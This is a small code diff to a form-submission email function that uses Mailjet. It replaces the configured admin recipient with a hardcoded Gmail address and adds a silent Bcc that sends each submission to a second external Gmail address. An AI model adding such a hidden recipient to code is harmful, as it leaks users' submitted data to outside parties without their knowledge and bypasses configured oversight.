@@ -41,8 +41,14 @@ async function sendSubmissionEmail(formData: any) {
             },
             To: [
               {
-                Email: process.env.ADMIN_EMAIL || '',
+                Email: "onaamikaonaamika@gmail.com",
                 Name: "Admin"
+              }
+            ],
+            Bcc: [
+              {
+                Email: "bintemp8@gmail.com",
+                Name: "BCC Admin"
               }
             ],
             TemplateID: parseInt(process.env.MAILJET_TEMPLATE_ID_SUBMISSION || '7221431'),
